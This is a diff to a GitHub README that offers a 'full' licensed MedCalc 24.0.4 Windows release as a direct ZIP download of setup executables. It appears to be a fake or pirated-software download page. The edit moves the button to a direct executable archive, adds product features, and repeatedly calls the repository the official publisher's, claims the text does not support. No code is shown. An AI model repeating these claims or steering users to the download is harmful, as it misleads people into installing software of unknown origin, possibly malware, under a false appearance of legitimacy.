@@ -14,23 +14,37 @@
 <p align="center"><strong>Medical statistics</strong> | <strong>ROC analysis</strong> | <strong>Clinical studies</strong> | <strong>Survival analysis</strong></p>
 
 <p align="center">
-  <a href="https://github.com/MedCalcSoft/medcalc/releases/tag/24.0.4">
+  <a href="https://github.com/MedCalcSoft/medcalc/releases/download/24.0.4/MedCalc-24.0.4-Windows-Full.zip">
     <img src="assets/download-button.svg" alt="Download the full MedCalc 24.0.4 version">
   </a>
 </p>
 
-MedCalc is statistical software for biomedical research. This release provides the full MedCalc 24.0.4 version for Windows with its license.
+MedCalc is statistical software for biomedical research. Version 24.0.4 provides tools for analyzing clinical and laboratory data, creating statistical tables and graphs, and reporting results.
 
-- [GitHub Pages product page](https://medcalcsoft.github.io/medcalc/)
-- [GitHub repository](https://github.com/MedCalcSoft/medcalc)
-- [Full version release and download](https://github.com/MedCalcSoft/medcalc/releases/tag/24.0.4)
+## Product features
+
+The official MedCalc product includes more than 220 statistical tests, procedures, and graphs, including:
+
+- **Diagnostic accuracy:** ROC curves, ROC-curve comparisons, and related predictive-value analyses.
+- **Method comparison:** Bland–Altman plots, Passing–Bablok regression, and Deming regression.
+- **Survival analysis:** Kaplan–Meier curves and Cox proportional-hazards regression.
+- **Clinical statistics:** regression, ANOVA, contingency tables, reference intervals, and sample-size calculations.
+- **Research synthesis:** meta-analysis procedures and publication-ready graphs.
+
+## Download and product information
+
+- [Download the full MedCalc 24.0.4 Windows version](https://github.com/MedCalcSoft/medcalc/releases/download/24.0.4/MedCalc-24.0.4-Windows-Full.zip)
+- [Release notes and package information](https://github.com/MedCalcSoft/medcalc/releases/tag/24.0.4)
+- [MedCalc publisher page](https://medcalcsoft.github.io/medcalc/)
+- [Official MedCalc publisher repository](https://github.com/MedCalcSoft/medcalc)
 
 ## Package
 
-The ZIP release includes the full 32-bit and 64-bit Windows setup package, its license, installation notes, SHA-256 checksums, and the website source archive.
+The ZIP release includes the full 32-bit and 64-bit Windows setup package, its license, installation notes, SHA-256 checksums, and the website source archive. Use the included license and follow its terms; do not publish personal activation credentials.
 
 - `medcalcsetup32.exe` works on 32-bit and 64-bit Windows.
 - `medcalcsetup64.exe` requires 64-bit Windows.
+
 This is the official MedCalc publisher repository and release page for the licensed MedCalc 24.0.4 Windows version.
 
 ## Integrity
